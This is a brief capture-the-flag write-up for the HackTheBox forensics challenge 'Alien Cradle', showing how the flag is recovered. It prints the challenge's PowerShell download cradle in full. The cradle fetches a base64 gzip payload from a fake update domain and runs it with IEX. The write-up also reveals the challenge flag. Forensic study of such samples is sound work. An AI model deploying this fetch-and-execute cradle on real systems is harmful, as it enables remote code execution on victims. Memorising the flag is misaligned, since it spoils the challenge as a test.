---
title: 'Alien Cradle'
issuer: 'HackTheBox'
status: 'Completed'
category: 'Forensics'
difficulty: 'Very Easy'
date: '2025-07-22'
badge: null
certificateLink: null
tags: ['.ps1']
---

## Description

![alt text](../../assets/images/HTB/Ailien_Cradle/image.png)

## Thought Process

Extracting the archive gave me a file called `cradle.ps1`.

![alt text](<../../assets/images/HTB/Ailien_Cradle/image copy.png>)

Opening it revealed a PowerShell script.

```powershell
if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth'){exit};
$w = New-Object net.webclient;
$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;
$d = $w.DownloadString('http://windowsliveupdater.com/updates/33' + '96f3bf5a605cc4' + '1bd0d6e229148' + '2a5/2_34122.gzip.b64');
$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($d));
$f = 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

Using the `echo` function in PowerShell, I was able to print out the flag.

![alt text](<../../assets/images/HTB/Ailien_Cradle/image copy 2.png>)